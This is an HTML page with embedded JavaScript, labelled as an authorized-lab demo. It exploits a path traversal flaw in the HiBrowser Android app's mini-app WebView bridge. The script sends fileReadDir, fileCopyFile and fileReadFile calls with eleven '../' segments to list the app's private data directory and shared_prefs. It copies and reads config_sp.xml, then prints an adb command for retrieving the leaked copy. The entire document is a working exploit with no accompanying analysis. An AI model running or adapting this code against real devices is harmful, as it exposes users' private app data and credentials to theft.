<!doctype html>
<html>
<head><meta charset="utf-8"><title>private read demo</title></head>
<body>
<h3>HiBrowser path traversal demo (authorized lab only)</h3>
<pre id="out"></pre>
<script>
(function () {
  var PKG = "com.talpa.hibrowser";          
  var APP_ID = "1000681057309249536";        
  var OUT = document.getElementById("out");
  function log(s) { OUT.textContent += s + "\n"; }

  var PRIV = "../".repeat(11) + "data/data/" + PKG + "/";

  function envelope(methodName, args, callbackId) {
    return JSON.stringify({
      abilityName: "Api", renderId: "1", target: "native", source: "render",
      dataJson: {
        methodName: methodName,
        callbackId: callbackId,
        dataJson: JSON.stringify({ time: Date.now() }),
        args: JSON.stringify(args)
      },
      callbackId: callbackId,
      time: Date.now()
    });
  }

  function callApi(methodName, args, callbackId) {
    try {
      window.dltLocalChannel.callBridgeApi(envelope(methodName, args, callbackId));
      log("[sent] " + methodName + " -> " + callbackId);
    } catch (e) {
      log("[error] " + methodName + ": " + e);
    }
  }

  // 异步结果走 onMessage，不是 callBridgeApi 的返回值
  window.onMessage = function (m) {
    var id = (m && m.callbackId) || "?";
    var raw = String((m && m.dataJson) || "");
    log("[callback " + id + "]\n" + raw.slice(0, 2000) + "\n---");
  };

  if (!window.dltLocalChannel || !window.dltLocalChannel.callBridgeApi) {
    log("no dltLocalChannel — page not in mini-app WebView");
    return;
  }

  setTimeout(function () {
    callApi("fileReadDir", { dirPath: PRIV }, "demo_ls_root");
  }, 500);

  setTimeout(function () {
    callApi("fileReadDir", { dirPath: PRIV + "shared_prefs/" }, "demo_ls_sp");
  }, 1500);

  setTimeout(function () {
    var src = PRIV + "shared_prefs/config_sp.xml";  
    callApi("fileCopyFile", { srcPath: src, destPath: "demo_leaked_config.xml" }, "demo_copy");
  }, 2500);

  setTimeout(function () {
    var src = PRIV + "shared_prefs/config_sp.xml";  
    callApi("fileReadFile", {
      filePath: src,
      encoding: "utf-8",
      position: 0,
      length: 512
    }, "demo_read_head");
  }, 3500);

  log("PRIV prefix (concept): " + PRIV);
  log("After copy, on host: adb shell cat .../byteapp_files/" + APP_ID + "/temp_data/demo_leaked_config.xml");
})();
</script>
</body>
</html>
